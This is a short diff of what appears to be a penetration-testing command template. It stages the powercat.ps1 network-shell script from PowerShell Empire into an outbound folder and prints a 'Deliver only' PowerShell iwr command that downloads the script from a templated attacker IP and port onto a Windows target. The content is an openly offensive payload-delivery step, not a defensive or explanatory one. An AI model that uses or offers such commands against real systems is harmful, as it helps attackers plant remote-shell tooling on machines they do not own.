@@ -6,7 +6,7 @@ metadata:
   authors: ["Unknown"]
 
 content: |
-  mkdir -p packstation/outbound; cp -n /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 packstation/outbound; \
+  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/powershell-empire/powercat.ps1 packstation/outbound; \
   printf '%s\n' '================================================================'; \
   printf '%s\n' '                      -----PowerShell-----                      '; \
   printf '%s\n' 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powercat.ps1 -Outfile {{ delivery_path_windows }}\powercat.ps1'; \
